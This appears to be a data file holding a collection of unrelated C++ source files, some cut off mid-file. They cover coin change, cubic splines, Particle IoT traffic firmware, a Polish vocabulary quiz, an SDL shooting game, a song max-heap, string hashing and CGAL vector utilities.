    "//{ Driver Code Starts\n#include <bits/stdc++.h>\nusing namespace std;\n\n// } Driver Code Ends\n\n#include <vector>\n#include <unordered_map>\nusing namespace std;\n\nclass Solution {\nprivate:\n    unordered_map<int, int> memo; // Memoization table\n    \n    int solve(vector<int>& coins, int M, int V, int sum) {\n        if (sum == V) {\n            return 0;\n        }\n        if (sum > V) {\n            return -1; // Invalid path\n        }\n        \n        // Check if the result for the current sum is already calculated\n        if (memo.count(sum)) {\n            return memo[sum];\n        }\n        \n        int minCoins = INT_MAX;\n        \n        // Try all possible coins and choose the one that gives the minimum number of coins\n        for (int i = 0; i < M; ++i) {\n            int result = solve(coins, M, V, sum + coins[i]);\n            if (result != -1) {\n                minCoins = min(minCoins, result + 1);\n            }\n        }\n        \n        // Update the memoization table\n        memo[sum] = (minCoins == INT_MAX) ? -1 : minCoins;\n        \n        return memo[sum];\n    }\n    \npublic:\n    int minCoins(vector<int>& coins, int M, int V) {\n        return solve(coins, M, V, 0);\n    }\n};\n\n\n\n//{ Driver Code Starts.\nint main() \n{\n   \n   \n   \tint t;\n    cin >> t;\n    while (t--)\n    {\n        int v, m;\n        cin >> v >> m;\n\n        vector<int> coins(m);\n        for(int i = 0; i < m; i++)\n        \tcin >> coins[i];\n\n      \n\t    Solution ob;\n\t    cout << ob.minCoins(coins, m, v) << \"\\n\";\n\t     \n    }\n    return 0;\n}\n\n// } Driver Code Ends",
    "//\n// CubicSpline.cc\n// CubicSplineLib/\n//\n// Source file for the \"CubicSpline\" class. This object facilitates natural\n// cubic spline interpolation. Once instantiated the\n// constructor builds the spline polynomials on the intervals of the (x, y)\n// data provided and retains them for later invocation. Parallelized using\n// OpenMP.\n//\n// Copyright (C) Geoffrey Lentner 2015. All rights reserved.\n// See LICENCE file. (GPL v2.0) \n//\n// contact: Geoffrey Lentner, B.S.\n//          Graduate Student / Researcher\n//          102 Natural Science Building\n//          Department of Physics & Astronomy\n//          University of Louisville\n//          Louisville, KY 40292 USA\n//\n// email:   geoffrey.lentner@louisville.edu\n//\n// updated: 2015-1-19 13:10:30 EST\n//\n\n#include <iostream>\n#include <cmath>\n#include <vector>\n#include <algorithm>\n#include <exception>\n// #include <omp.h>\n\n#include <plan_manage/CubicSpline.h>\n\n// primary constructor\ntemplate<class T>\nCubicSpline<T>::CubicSpline( const std::vector<T>& _x_, const std::vector<T>& _y_,\n    int parallel, bool sorted ){\n\n    // check for valid input arguments\n    if ( _x_.size( ) < 4 || _y_.size( ) < 4 )\n        throw SplineError(\"[_x_.size( ) < 4 || _y_.size( ) < 4]\");\n    \n    if ( _x_.size( ) != _y_.size( ) )\n        throw SplineError(\"[_x_.size( ) != _y_.size( )]\");\n    \n    if ( parallel < 1 )\n        throw SplineError(\"[parallel < 1]\");\n    \n    // if ( parallel > omp_get_max_threads( ) )\n    //     throw SplineError(\"[parallel > omp_get_max_threads()]\");\n    \n    // // set parallelism\n    // omp_set_num_threads( parallel );\n    \n\t// last element in array has index 'n'\n\tn = _x_.size( ) - 1;\n   \n\t// local copy of the vectors\n    x = _x_;\n    y = _y_;\n    \n    // if not suppressed, ensure 'x' elements are in ascending order\n    if ( !sorted ) quicksort( );\n    \n    // build the spline polynomials on the intervals\n    build_splines( );\n}\n\n// copy constructor\ntemplate<class T>\nCubicSpline<T>::CubicSpline( const CubicSpline<T>& aCubicSpline ){\n\n    // copy over data\n    n = aCubicSpline.n;\n    x = aCubicSpline.x;\n    y = aCubicSpline.y;\n    a = aCubicSpline.a;\n    b = aCubicSpline.b;\n    k = aCubicSpline.k;\n}\n\n// recursive quicksort on member vectors 'x' and 'y'\ntemplate<class T>\nvoid CubicSpline<T>::quicksort ( const long& left , const long& right ) {\n    \n\t// local values\n    long l = left, r = right;\n\n\t// assign the value of the pivot to the mid-point,\n\t// this is the best option for uniform distribution\n    T pivot = x[ ( left + right ) / 2 ];\n    \n    // partition the arrays\n    while ( l <= r ) {\n        \n        while ( x[l] < pivot ) l++;\n        while ( x[r] > pivot ) r--;\n        \n        if ( l <= r ) {\n            \n            std::iter_swap( x.begin( ) + l, x.begin( ) + r );\n            std::iter_swap( y.begin( ) + l, y.begin( ) + r );\n            \n            l++; r--;\n        }\n    }\n    \n    // recursively call quicksort while appropriate\n    if ( left < r     ) quicksort ( left , r     );\n    if (    l < right ) quicksort ( l    , right );\n}\n\n// meta quicksort with parallel threads on class member 'data'\ntemplate<class T>\nvoid CubicSpline<T>::quicksort( ) {\n    \n    if ( false ) {\n        \n        // code needs revision\n    \n    } else quicksort( 0, n );\n}\n\n// build natural cubic spline polynomials\ntemplate<class T>\nvoid CubicSpline<T>::build_splines( ){\n\n\t// coefficients for tridiagonal linear system\n    a.resize( n + 1 );\n    b.resize( n + 1 );\n    c.resize( n + 1 );\n    d.resize( n + 1 );\n    \n\t// optimize for re-occurring quantities\n\tT diffx1, diffx2, diffy1, diffy2;\n\n\tdiffx1 = x[1] - x[0];\n\tdiffy1 = y[1] - y[0];\n\n\t// first values\n\ta[0] = 0.0;\n\tc[0] = 1.0 / diffx1;\n\tb[0] = 2.0 * c[0];\n\td[0] = 3.0 * diffy1 / ( diffx1 * diffx1 );\n\n\t// solve for coefficients of linear system\n\t#pragma omp parallel for\n\tfor ( long i = 1; i < n; i++ ){\n\n\t\tdiffx1 = x[i  ] - x[i-1];\n\t\tdiffx2 = x[i+1] - x[i  ];\n\t\tdiffy1 = y[i  ] - y[i-1];\n\t\tdiffy2 = y[i+1] - y[i  ];\n\n\t\ta[i] = 1.0 / diffx1;\n\t\tc[i] = 1.0 / diffx2;\n\t\tb[i] = 2.0 * (a[i] + c[i]);\n\t\td[i] = 3.0 * ( diffy1 / ( diffx1 * diffx1 ) + diffy2 /\n                      ( diffx2 * diffx2 ) );\n\t}\n\n\t// set last remaining values\n\tdiffx2 = x[n] - x[n-1];\n\tdiffy2 = y[n] - y[n-1];\n\n\ta[n] = 1.0 / diffx2;\n\tb[n] = 2.0 * a[n];\n\tc[n] = 0.0;\n\td[n] = 3.0 * diffy2 / ( diffx2 * diffx2 );\n\n\t// transform coefficients for the \"Thomas algorithm\"\n    c_prime.resize( n );\n    d_prime.resize( n + 1 );\n    \n\tc_prime[0] = c[0] / b[0];\n\td_prime[0] = d[0] / b[0];\n\n\tfor ( long i = 1; i < n; i++ ) {\n\t\n\t\tc_prime[i] = c[i] / ( b[i] - a[i] * c_prime[i-1] );\n\t\td_prime[i] = (d[i] - a[i] * d_prime[i-1]) / (b[i] - a[i] * c_prime[i-1]); \n\t}\n\n\t// last one\n\td_prime[n] = (d[n] - a[n] * d_prime[n-1]) / (b[n] - a[n] * c_prime[n-1]);\n\n\t// solve the linear system for the derivative of the splines\n    k.resize( n + 1 );\n\n\t// the last one first\n\tk[n] = d_prime[n];\n\n\t// the remaining are solved via back substitution\n\tfor ( long i = n - 1; i >= 0; i-- )\n\t\tk[i] = d_prime[",
    "/*\n * Project trafficLogic\n * Author: Christian Chavez\n * Date: April 29th, 2024\n * For comprehensive documentation and examples, please visit:\n * https://docs.particle.io/firmware/best-practices/firmware-template/\n */\n\n// Include Particle Device OS APIs\n#include \"Particle.h\"\n\n#include \"Adafruit_GFX.h\" //for OLED display\n#include \"Adafruit_SSD1306.h\"\n\n#include \"neopixel.h\"\n\n// Define parameters for OLED and create 'display' object\n#define OLED_RESET D4\nAdafruit_SSD1306 display(OLED_RESET);\n\n// Define number of pixels and create 'pixel' object/'\n\nconst int PIXELCOUNT = 64;\nAdafruit_NeoPixel pixel(PIXELCOUNT, SPI1, WS2812B);\nint pixelPattern = 0; // variable to track pixel sequences (0 = ambient colors, 1 = low traffic, 2 = heavy traffic, 3 = time to leave, 4 = late)\nint pixelColor = 0x0000FF; // variable to store color variable starting with default blue\nint pixelBrightness = 100; // variable for pixel brightness 0-255\n\nint myTimeZone = -7; // variable to adjust time zone from UTC\n\nunsigned int logicCallInterval = 60000; // default to calling logic every 60000 milliseconds\nunsigned int lastTime = -logicCallInterval; // used to track last time logic was called\nunsigned int lastShowTime = -60000; // variable to track last pixel update\n\n\n// default paramaters for tomtom api call\nString travelLocations = \"34.1808,-118.3089:33.9416,-118.4085\"; // Burbank to LAX\nString routeDescription = \"Burbank to LAX\";\nint travelTimeInSeconds = -999;\nint trafficDelayInSeconds = -999;\nint targetHour = 10; // (-1 = no specified arrival time, -2 = nighttime, no destinations)\nint targetMinute = 00;\nint minutesToLeave = -999;\n\nchar data[particle::protocol::MAX_EVENT_DATA_LENGTH + 1]; //stores json data event sent during logic call\n\n// Let Device OS manage the connection to the Particle Cloud\nSYSTEM_MODE(AUTOMATIC);\n\n// Run the application and system concurrently in separate threads\nSYSTEM_THREAD(ENABLED);\n\n// Show system, cloud connectivity, and application logs over USB\n// View logs with CLI using 'particle serial monitor --follow'\n// SerialLogHandler logHandler(LOG_LEVEL_INFO);\n\n// create prototypes of functions\nvoid handleResponse(const char *event, const char *data);\n\nvoid lightPixels(int patternNumber);\n\n// setup() runs once, when the device is first turned on\nvoid setup()\n{\n  Serial.begin(9600);\n  delay(1000);                           // wait for the serial monitor to initialize\n  Serial.printf(\"PLEASE STAND BY...\\n\"); // print waiting message on serial monitor\n\n  // display setup\n  display.begin(SSD1306_SWITCHCAPVCC, 0x3C); // initialize with the I2C address of the display\n  display.clearDisplay();\n  display.setTextSize(1);\n  display.setTextColor(BLACK, WHITE);     // text will print in black with white background\n  display.printf(\"PLEASE STAND BY...\\n\"); // print waiting message on display\n  display.display();                      // update display to show text\n\n  // neopixel setup\n  pixel.begin();\n  pixel.setBrightness(pixelBrightness);\n  pixel.clear();\n  pixel.show();\n\n  for (int i = 0; i < PIXELCOUNT; i++)\n  { // light up all pixels random colors on startup\n    pixel.setPixelColor(i, random(0x000000, 0xFFFFFF));\n    pixel.show();\n  }\n\n  delay(1000);\n\n  // time setup\n  Particle.syncTime();\n  Time.zone(myTimeZone);\n\n  // Particle.subscribe(\"TomTomResponse\", handleResponse, ALL_DEVICES); // assign handleResponse function to run on response from Particle subscription\n  Particle.subscribe(\"calculateRouteResponse\", handleResponse, ALL_DEVICES); // assign handleResponse function to run on response from Particle subscription\n  lastTime = -120000;                                                        // intitialize our timer variable\n}\n\nvoid loop()\n{\n  lightPixels(pixelPattern);\n\n  if (Particle.connected() && millis() - lastTime > logicCallInterval)\n  {\n    Serial.printf(\"\\n\\nLocal Time Now: %02i:%02i\\n\\n\", Time.hour(), Time.minute()); // print current time\n\n    JSONBufferWriter writer(data, sizeof(data) - 1); //build json data\n\n    writer.beginObject();\n\n    writer.name(\"coordinates\").value(travelLocations);\n    writer.name(\"h\").value(Time.hour());\n    writer.name(\"m\").value(Time.minute());\n    writer.name(\"s\").value(Time.second());\n    writer.name(\"yr\").value(Time.year());\n    writer.name(\"mo\").value(Time.month());\n    writer.name(\"d\").value(Time.weekday());\n    writer.name(\"tz\").value(Time.zone());\n\n    writer.endObject();\n\n    Serial.printf(\"json: %s\\n\", data);\n\n    Particle.publish(\"trafficLogic\", data); // call Particle Logic function\n\n    lastTime = millis(); // reset our timer\n  }\n}\n\nvoid handleResponse(const char *event, const char *data)\n{\n  Serial.printf(\"\\n\\nWebhook response...\\n\\n\");\n\n  Serial.printf(\"\\ndata: %s\\n\", data);\n\n  if (data) //if data is valid\n  {\n    //parse json data from webhook responses\n    JSONValue tomtomData = JSONValue::parseCopy(data); \n    if (tomtomData.isValid())\n    {\n      JSONObjectIterator iterator(tomtomData);\n      while (iterator.next())\n      {\n        if (iterator.name() == \"pixelBri",
    "\ufeff// QuizletXD.cpp : Ten plik zawiera funkcj\u0119 \u201emain\u201d. W nim rozpoczyna si\u0119 i ko\u0144czy wykonywanie programu.\n//CTRL + F5 odpalasz \n\n#include<iostream>\n#include<cstdlib>\n#include<fstream>\n#include<string>\n#include<ctime>\n#include<cmath>\nusing namespace std;\n\nint ILOSC_SLOW = 318; // Tu wpisujesz ile jest wierszy w pliku (te poziome(plasko)) po czym naciskasz   CTRL + S  (plus oznacza, ze te dwa guziki xD)\n\n\nint generowanieNumeruSlowaWisielec() {\n\tsrand(time(NULL));\n\n\tint numerSlowa = (rand() * 2137 % (ILOSC_SLOW * 2));\n\tif (numerSlowa % 2 == 0) {\n\t\tnumerSlowa++;\n\t}\n\treturn numerSlowa;\n}\n\nvoid generowanieSlowaDoOdgadniecia(int numerSlowa, char* slowoDoOdgadniecia) {\n\tchar pusteWczytanie[80] = { 0 };\n\tfstream wczytanieSlowaZPliku;\n\twczytanieSlowaZPliku.open(\"Slowniczek_muzyczny.txt\", ios::in);// pomiedzy znakami \"Tu_Wpisujesz_Nazwe_Swojego_Pliku.txt\" nie zapomnij .txt na ko\u0144cu a potem CTRL+S    \n\t//Nazwa pliku musi by\u0107 bez polskich znakow i zamiast spacji wpisz _ (Shift + -  =  _  )\n\tfor (int j = 1; j < numerSlowa; j++) {\n\t\twczytanieSlowaZPliku >> pusteWczytanie;\n\t}\n\twczytanieSlowaZPliku >> slowoDoOdgadniecia;\n}\n\nint main()\n{\n\tbool kontynuacja = true;\n\tint punkty = 0;\n\tint bledy = 0;\n\tint przyklad = 0;\n\twhile (kontynuacja) {\n\t\tint numer = generowanieNumeruSlowaWisielec();\n\t\tprzyklad++;\n\t\tchar slowo_do_odgadniecia[80] = { 0 };\n\t\tchar slowo_do_odgadniecia2[80] = { 0 };\n\t\tgenerowanieSlowaDoOdgadniecia(numer, slowo_do_odgadniecia);\n\t\tgenerowanieSlowaDoOdgadniecia(numer + 1, slowo_do_odgadniecia2);\n\t\tstd::cout << \"Slowo do odgadniecia nr.\" << przyklad << \" to:\\n\" << slowo_do_odgadniecia << endl;\n\t\tchar slowo_zgadywane[30] = { 0 };\n\t\tcin >> slowo_zgadywane;\n\t\tcout << slowo_do_odgadniecia2 << endl << \"Czy napisalas dobrze?\\n 1=tak\\t2=nie\\t3=inne tlumaczenie\\ninne = koniec\\n\";\n\t\tint dobrze = 0;\n\t\tcin >> dobrze;\n\t\tif (dobrze == 1) {\n\t\t\tpunkty++;\n\t\t}\n\t\telse if (dobrze == 2) {\n\t\t\tbledy++;\n\t\t}\n\t\telse if (dobrze == 3) {\n\t\t\tprzyklad--;\n\t\t}\n\t\telse {\n\t\t\tcout << \"WTF?! co ty wpisalas? Przestajemy sie lubic i sie wylaczam \\n>:(\\n\";\n\t\t\tkontynuacja = false;\n\t\t}\n\t\tcout << \"Twoje punkty to:\\nDobrze:\" << punkty << \"\\nzle:\\t\" << bledy << endl;\n\t\tsystem(\"PAUSE\");\n\t\tsystem(\"CLS\");\n\t}\n}\n\n\n\n// Uruchomienie programu: Ctrl + F5 lub menu Debugowanie > Uruchom bez debugowania\n// Debugowanie programu: F5 lub menu Debugowanie > Rozpocznij debugowanie\n\n// Porady dotycz\u0105ce rozpoczynania pracy:\n//   1. U\u017cyj okna Eksploratora rozwi\u0105za\u0144, aby doda\u0107 pliki i zarz\u0105dza\u0107 nimi\n//   2. U\u017cyj okna programu Team Explorer, aby nawi\u0105za\u0107 po\u0142\u0105czenie z kontrol\u0105 \u017ar\u00f3d\u0142a\n//   3. U\u017cyj okna Dane wyj\u015bciowe, aby sprawdzi\u0107 dane wyj\u015bciowe kompilacji i inne komunikaty\n//   4. U\u017cyj okna Lista b\u0142\u0119d\u00f3w, aby zobaczy\u0107 b\u0142\u0119dy\n//   5. Wybierz pozycj\u0119 Projekt > Dodaj nowy element, aby utworzy\u0107 nowe pliki kodu, lub wybierz pozycj\u0119 Projekt > Dodaj istniej\u0105cy element, aby doda\u0107 istniej\u0105ce pliku kodu do projektu\n//   6. Aby w przysz\u0142o\u015bci ponownie otworzy\u0107 ten projekt, przejd\u017a do pozycji Plik > Otw\u00f3rz > Projekt i wybierz plik sln\n",
    "// Game.cpp\n#include \"Game.h\"\n#include <string>\nusing namespace std;\nconstexpr Uint32 FRAME_DELAY = 16; // \ud504\ub808\uc784 \uace0\uc815\n\nGame::Game() {\n    // SDL \ucd08\uae30\ud654\n    SDL_Init(SDL_INIT_VIDEO);\n\n    // \uc708\ub3c4\uc6b0 \uc0dd\uc131\n    window = SDL_CreateWindow(\"Shooting Game\", SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, 1440, 900, SDL_WINDOW_SHOWN);\n    if (window == nullptr) {\n        cerr << \"Failed to create window: \" << SDL_GetError() << endl;\n        exit(1);\n    }\n\n    // \ub80c\ub354\ub7ec \uc0dd\uc131\n    renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED);\n    if (renderer == nullptr) {\n        cerr << \"Failed to create renderer: \" << SDL_GetError() << endl;\n        SDL_DestroyWindow(window);\n        SDL_Quit();\n        exit(1);\n    }\n\n    // \ubc30\uacbd\ud654\uba74 \uc774\ubbf8\uc9c0 \ub85c\ub4dc\n    backgroundTexture = loadTexture(\"C:/Users/JunHyeok/Desktop/Shooting_game/background.png\");//\uc774\ubbf8\uc9c0 \ubd88\ub7ec\uc624\ub294 \ud30c\uc77c \uc704\uce58\n    if (backgroundTexture == nullptr) {\n        cerr << \"Failed to load background texture\" << endl;\n        cleanup();\n        exit(1);\n    }\n\n    // \uce90\ub9ad\ud130 \uc774\ubbf8\uc9c0 \ub85c\ub4dc\n    characterTexture = loadTexture(\"C:/Users/JunHyeok/Desktop/Shooting_game/character.png\");\n    if (characterTexture == nullptr) {\n        cerr << \"Failed to load character texture\" << endl;\n        cleanup();\n        exit(1);\n    }\n\n    // \uba54\uc778\uba54\ub274 \uc774\ubbf8\uc9c0 \ub85c\ub4dc\n    mainmenuTexture = loadTexture(\"C:/Users/JunHyeok/Desktop/Shooting_game/coupangmaster.png\");\n    if (mainmenuTexture == nullptr) {\n        cerr << \"Failed to load main texture\" << endl;\n        cleanup();\n        exit(1);\n    }\n\n    helpmenu_one_Texture = loadTexture(\"C:/Users/JunHyeok/Desktop/Shooting_game/helpmenu1.png\");\n    if (helpmenu_one_Texture == nullptr) {\n        cerr << \"Failed to load help texture\" << endl;\n        cleanup();\n        exit(1);\n    }\n    helpmenu_two_Texture = loadTexture(\"C:/Users/JunHyeok/Desktop/Shooting_game/helpmenu2.png\");\n    if (helpmenu_two_Texture == nullptr) {\n        cerr << \"Failed to load help texture\" << endl;\n        cleanup();\n        exit(1);\n    }\n    startbuttonTexture = loadTexture(\"C:/Users/JunHyeok/Desktop/Shooting_game/startbutton.png\");\n    if (startbuttonTexture == nullptr) {\n        cerr << \"Failed to load startbutton texture\" << endl;\n        cleanup();\n        exit(1);\n    }\n\n    helpbuttonTexture = loadTexture(\"C:/Users/JunHyeok/Desktop/Shooting_game/helpbutton.png\");\n    if (helpbuttonTexture == nullptr) {\n        cerr << \"Failed to load helpbutton texture\" << endl;\n        cleanup();\n        exit(1);\n    }\n    clearfirstTexture = loadTexture(\"C:/Users/JunHyeok/Desktop/Shooting_game/clearfirst.png\");\n    if (clearfirstTexture == nullptr) {\n        cerr << \"Failed to load clearfirst texture\" << endl;\n        cleanup();\n        exit(1);\n    }\n    clearlastTexture = loadTexture(\"C:/Users/JunHyeok/Desktop/Shooting_game/clearlast.png\");\n    if (clearlastTexture == nullptr) {\n        cerr << \"Failed to load clearlast texture\" << endl;\n        cleanup();\n        exit(1);\n    }\n    gameoverTexture = loadTexture(\"C:/Users/JunHyeok/Desktop/Shooting_game/gameover.png\");\n    if (gameoverTexture == nullptr) {\n        cerr << \"Failed to load gameover texture\" << endl;\n        cleanup();\n        exit(1);\n    }\n    nextbuttonTexture = loadTexture(\"C:/Users/JunHyeok/Desktop/Shooting_game/nextbutton.png\");\n    if (gameoverTexture == nullptr) {\n        cerr << \"Failed to load gameover texture\" << endl;\n        cleanup();\n        exit(1);\n    }\n    gameoverButtonTexture = loadTexture(\"C:/Users/JunHyeok/Desktop/Shooting_game/gameoverbutton.png\");\n    if (gameoverTexture == nullptr) {\n        cerr << \"Failed to load gameover texture\" << endl;\n        cleanup();\n        exit(1);\n    }\n    heartTexture = loadTexture(\"C:/Users/JunHyeok/Desktop/Shooting_game/Heart.png\");\n    if (heartTexture == nullptr) {\n        cerr << \"Failed to load heart texture\" << endl;\n        cleanup();\n        exit(1);\n    }\n    story_start_one_Texture = loadTexture(\"C:/Users/JunHyeok/Desktop/Shooting_game/Story1.png\");\n    if (story_start_one_Texture == nullptr) {\n        cerr << \"Failed to load heart texture\" << endl;\n        cleanup();\n        exit(1);\n    }\n    story_start_two_Texture = loadTexture(\"C:/Users/JunHyeok/Desktop/Shooting_game/Story2.png\");\n    if (story_start_two_Texture == nullptr) {\n        cerr << \"Failed to load heart texture\" << endl;\n        cleanup();\n        exit(1);\n    }\n    story_next_one_Texture = loadTexture(\"C:/Users/JunHyeok/Desktop/Shooting_game/Story3.png\");\n    if (story_next_one_Texture == nullptr) {\n        cerr << \"Failed to load heart texture\" << endl;\n        cleanup();\n        exit(1);\n    }\n    story_next_two_Texture = loadTexture(\"C:/Users/JunHyeok/Desktop/Shooting_game/Story4.png\");\n    if (story_next_two_Texture == nullptr) {\n        cerr << \"Failed to load heart texture\" << endl;\n        cleanup();\n        exit(1);\n    }\n    story_end_one_Texture = loadTexture(\"C:/Users/JunHyeok/Desktop/Shooting_game/Story5.png\");\n    if (story_end_one_Texture == nullptr) {\n        cerr << \"Failed to load heart texture\" << endl;\n     ",
    "#include \"Heap.h\"\n#include <iostream>\n#include <vector>\n#include <cmath>\nusing namespace std;\n\nint Heap::Peek(){\n  if(heap.empty())return -1234; //Arbitary value. Can be changed. -Kian 10:26pm 4/17\n  return heap[0]->getSongDuration();//Assuming idx=0 is top. -Kian 10:27pm 4/17\n}\n\nvoid Heap::Push(Song *value) {\n    int index = heap.size();\n    heap.push_back(value);\n    value->setIdx(index);\n    PercolateUp(index); //Ensuring every element is in its proper place -Kian 4/17\n}\n\nSong* Heap::Pop() {//Changed to return Song* on 4/28/24 10:52AM -Kian F\n    if (heap.empty()){\n        cout<< \"Heap is empty!\"<<endl;\n        return nullptr;\n    } \n    Song* top=heap[0];\n    heap[0]=heap.back(); \n    heap.pop_back();                \n    if(!heap.empty())PercolateDown(0);//This prevents out of bounds errors when vector is empty-Kian F 4/28 12:11PM   \n    return top;\n}\n\nvoid Heap::PercolateUp(int index) {// Tested on 4/19/24 @6:55pm with Push() -4/19/24 KF\n    if (index<0) return;\n    int parentIndex=CalculateParentIndex(index);\n    if (heap[index]->getSongDuration()>heap[parentIndex]->getSongDuration()) { \n        Song *temp=heap[index];//Temp storage for child value - 4/19/2024 Kian F\n        heap[index]=heap[parentIndex];//Move parent value down - 4/19/2024 Kian F\n        heap[parentIndex]=temp;// Put the child value at correct position - 4/19/2024 Kian F\n        heap[index]->setIdx(index);\n        heap[parentIndex]->setIdx(parentIndex);\n        PercolateUp(parentIndex);\n    }\n}\n\nvoid Heap::PercolateDown(int index){//Tested as of 4/21/24 1:58PM-KF\n    int childIndex=2*index + 1;//Left child index-KF 4/20\n    Song *value=heap[index];\n\n    while(childIndex<(int)heap.size()){//Finding max-KF 4/20\n        int maxValue=value->getSongDuration();\n        int maxIndex=-1;\n\n        for (int i = 0;i< 2 && i + childIndex < (int)heap.size(); i++) {\n            int temp=i+childIndex;\n            if (heap[temp]->getSongDuration()>maxValue) {\n                maxValue=heap[temp]->getSongDuration();\n                maxIndex=temp;\n            }\n        }\n\n        if(maxValue==value->getSongDuration()){\n            return; //Restore heap-KF 4/20\n        }else{\n            swapNodesInHeap(index,maxIndex);//Tested as of 4/21/24 1:55PM-KF\n            index=maxIndex;//For the next iter-KF 4/20\n            childIndex=2*index + 1; \n        }\n    }\n}\n\nvoid Heap::Remove(int index){//Tested 9:39PM 4/21/2024-KF\n    if (index<0||index>=(int)heap.size()){\n        return;\n    }\n    heap[index]=heap.back();// Swap the element to be removed with the last element-KF 4/20 11:35AM\n    heap.pop_back();\n\n    //The following ensures the vector is still a heap-KF 4/20 11:37AM\n    if(index==0||heap[index]<heap[CalculateParentIndex(index)]){\n        PercolateDown(index);//Move the swapped value down-KF 4/20\n    }else{\n        PercolateUp(index);//Move the swapped Value up-KF 4/20\n    }\n}\n\nint Heap::Size(){\n    return heap.size();\n}\n\nbool Heap::Empty(){\n    return heap.empty();\n}\n\nint Heap::CalculateParentIndex(int index){ //Prevents rewriting the same code -KF 4/20 \n    return (index-1)/2;\n}\n\nvoid Heap::Display_heap(){//Mostly for debugging -KF 4/20\n    // if (heap.empty()) {\n    //     cout<<\"Heap is empty!\"<<endl;\n    //     return;\n    // }\n\n    // cout<<\"Heap elements: \";\n    // for (int element : heap){\n    //     cout << element << \" \";\n    // }\n    // cout << endl;\n}\n\nvoid Heap::swapNodesInHeap(int idx1,int idx2){//Feels wrong-KF 4/20/24 12:25PM\n    Song *temp=heap[idx1];\n    heap[idx1]=heap[idx2];\n    heap[idx2]=temp;\n}\n",
    "#include <bits/stdc++.h>\nusing namespace std;\n#define all(x) x.begin(), x.end()\n#define ll long long\n#define nl cout << \"\\n\"\n#define int long long\n#define nl cout << \"\\n\"\nconst ll M = 1e9+7;\n\n// calculate a^b % MOD using binary expo.\nll power(ll a, ll b)\n{\n    a = a % M;\n    ll res = 1;\n    while (b)\n    {\n        if (b & 1)\n            res = (a*res)%M ;\n        a = (a*a)%M;\n        b >>= 1;\n    }\n    return res;\n}\n\n\n// finds modular inverse of a w.r.t M\nll modularInverse(ll a) {return power(a, M - 2);}\n\n\n// still there are small chances of hash-collisions  \n// so check that too \nclass HashedString{\npublic:    \n    vector<ll> ps,psi, hash;\n    // change p and M if needed\n    ll p = 31; // a prime number\n    // const ll M = 1e9+7; \n    ll n;\n\n    HashedString(string &s){\n        n = s.size();\n        ps = vector<ll>(n,1);\n        psi = vector<ll>(n);\n        hash = vector<ll>(n);\n\n        for(ll i=1; i<n; i++)\n            ps[i] = (ps[i-1] * p )%M;\n        \n        for(ll i=0; i<n; i++)\n            psi[i] = modularInverse(ps[i]);\n        \n        hash[0] = (ctoi(s[0]) * ps[0])%M;\n        for(ll i=1; i<n; i++)\n            hash[i] =  (hash[i-1] + (ctoi(s[i]) * ps[i])%M ) %M;\n        \n    }\n\n\n    // change it as per need\n    ll ctoi(char c){\n        // return int(c-'a'+1);\n        return c;\n    }\n\n    // get hash value of substring that starts at i and ends at j\n    ll getHash(int i, int j){\n        if(i == 0)\n            return hash[j];\n\n        return (\n            ((hash[j]-hash[i-1]+M) % M)\n            * psi[i]\n        ) % M;\n    }\n\n    // start index and length of sub-string\n    ll getHashFromLen(int i, int len){\n        return getHash(i, i+len-1);\n    }\n};\n\n",
    "#include \"vector_algebra_utils.h\"\n\nnamespace\n{\nusing Matrix3 = std::array<std::array<double, 3>, 3>;\n\nMatrix3 getIdentityMatrix()\n{\n  Matrix3 res;\n  for (std::size_t i = 0; i < 3; i++)\n    for (std::size_t j = 0; j < 3; j++) res[i][j] = i == j ? 1.0 : 0.0;\n  return res;\n}\n\nMatrix3 getZeroMatrix()\n{\n  Matrix3 res;\n  for (std::size_t i = 0; i < 3; i++)\n    for (std::size_t j = 0; j < 3; j++) res[i][j] = 0.0;\n  return res;\n}\n\nAffine toAffine(const Matrix3& rotation)\n{\n  return Affine(rotation[0][0], rotation[0][1], rotation[0][2], rotation[1][0], rotation[1][1], rotation[1][2],\n                rotation[2][0], rotation[2][1], rotation[2][2], 1.);\n}\n\nAffine toAffine(const Matrix3& rotation, const Vector_3& translation)\n{\n  return Affine(rotation[0][0], rotation[0][1], rotation[0][2], translation[0], rotation[1][0], rotation[1][1],\n                rotation[1][2], translation[1], rotation[2][0], rotation[2][1], rotation[2][2], translation[2], 1.);\n}\n\nMatrix3 toRotation(const Affine& affine)\n{\n  Matrix3 res;\n  for (int i = 0; i < 3; i++)\n    for (int j = 0; j < 3; j++) res[i][j] = affine.m(i, j);\n  return res;\n}\n\nMatrix3 asymmetricTensorProduct(const Vector_3& x, const Vector_3& y)\n{\n  Matrix3 res;\n  for (int i = 0; i < 3; i++)\n    for (int j = 0; j < 3; j++) res[i][j] = x[i] * y[j] - x[j] * y[i];\n  return res;\n}\n\nMatrix3 operator+(const Matrix3& lhs, const Matrix3& rhs)\n{\n  Matrix3 res;\n  for (std::size_t i = 0; i < 3; i++)\n    for (std::size_t j = 0; j < 3; j++) res[i][j] = lhs[i][j] + rhs[i][j];\n  return res;\n}\n\nMatrix3 operator*(const Matrix3& lhs, const Matrix3& rhs)\n{\n  Matrix3 res = getZeroMatrix();\n  for (std::size_t i = 0; i < 3; i++)\n    for (std::size_t j = 0; j < 3; j++)\n      for (std::size_t k = 0; k < 3; k++) res[i][j] += lhs[i][k] * rhs[k][j];\n  return res;\n}\n\nMatrix3 operator*(const Matrix3& lhs, double rhs)\n{\n  Matrix3 res;\n  for (std::size_t i = 0; i < 3; i++)\n    for (std::size_t j = 0; j < 3; j++) res[i][j] = lhs[i][j] * rhs;\n  return res;\n}\n\n// fuzzy comparison ops using length threshold of eps\n\nbool isZero(double a, double eps) { return std::fabs(a) < std::fabs(eps); }\n\nbool isOne(double a, double eps) { return isZero(1. - std::fabs(a), eps); }\n\nbool pointsEqual(const Point_3& p, const Point_3& q, double eps) { return (p - q).squared_length() < eps * eps; }\n\nbool pointsCollinear(const Point_3& p, const Point_3& q, const Point_3& r, double eps)\n{\n  return CGAL::cross_product(q - p, r - p).squared_length() < eps * eps * eps * eps;\n}\n\n}  // namespace\n\n/* Returns the unit vector\n *\n * if input is 0 vector it returns the input\n *\n */\nVector_3 unitVector(const Vector_3& t)\n{\n  if (t == Vector_3(0, 0, 0)) return t;\n  return t / std::sqrt(t.squared_length());\n}\n\n/* Returns the centroid of the points\n *\n */\nPoint_3 getCentroid(const std::vector<Point_3>& points)\n{\n  if (points.empty()) return Point_3(0., 0., 0.);\n\n  if (points.size() == 1) return points[0];\n\n  Point_3 origin(0., 